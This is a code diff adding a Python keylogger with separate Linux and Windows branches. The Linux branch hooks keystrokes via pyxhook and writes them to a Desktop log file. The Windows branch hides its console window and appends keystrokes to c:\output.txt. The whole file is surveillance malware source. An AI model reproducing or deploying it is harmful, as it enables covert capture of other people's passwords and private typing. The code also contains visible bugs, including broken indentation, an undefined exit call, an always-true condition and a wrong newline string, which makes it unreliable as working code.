@@ -1,0 +1,77 @@
+# importing libs
+import os 
+import sys
+
+# checking platform type
+if sys.platform == 'linux':
+    import pyxhook 
+    log_file = os.environ.get( 
+        'pylogger_file', 
+        os.path.expanduser('~/Desktop/log.txt') 
+    ) 
+    cancel_key = ord( 
+        os.environ.get( 
+            'pylogger_cancel', 
+            '`'
+        )[0] 
+    ) 
+          if os.environ.get('pylogger_clean', None) is not None: 
+        try: 
+            os.remove(log_file) 
+        except EnvironmentError: 
+           # File does not exist, or no permissions. 
+            pass
+      
+    #creating key pressing event and saving it into log file 
+    def OnKeyPress(event): 
+        with open(log_file, 'a') as f: 
+            f.write('{}\n'.format(event.Key)) 
+      
+    # create a hook manager object 
+    new_hook = pyxhook.HookManager() 
+    new_hook.KeyDown = OnKeyPress 
+    # set the hook 
+    new_hook.HookKeyboard() 
+    try: 
+        new_hook.start()         # start the hook 
+    except KeyboardInterrupt: 
+        # User cancelled from command line. 
+        pass
+    except Exception as ex: 
+        # Write exceptions to the log file, for analysis later. 
+        msg = 'Error while catching events:\n  {}'.format(ex) 
+        pyxhook.print_err(msg) 
+        with open(log_file, 'a') as f: 
+            f.write('\n{}'.format(msg))
+else: # platform is windows
+    import win32api 
+    import win32console 
+    import win32gui 
+    import pythoncom, pyHook 
+
+    win = win32console.GetConsoleWindow() 
+    win32gui.ShowWindow(win, 0) 
+      
+    def OnKeyboardEvent(event): 
+        if event.Ascii==5: 
+            _exit(1) 
+        if event.Ascii !=0 or 8: 
+            # open output.txt to read current keystrokes 
+            f = open('c:\output.txt', 'r+') 
+            buffer = f.read() 
+            f.close() 
+        # open output.txt to write current + new keystrokes 
+            f = open('c:\output.txt', 'w') 
+            keylogs = chr(event.Ascii) 
+            if event.Ascii == 13: 
+                keylogs = '/n'
+                buffer += keylogs 
+                f.write(buffer) 
+                f.close() 
+    # create a hook manager object 
+    hm = pyHook.HookManager() 
+    hm.KeyDown = OnKeyboardEvent 
+    # set the hook 
+    hm.HookKeyboard() 
+    # wait forever 
+    pythoncom.PumpMessages()
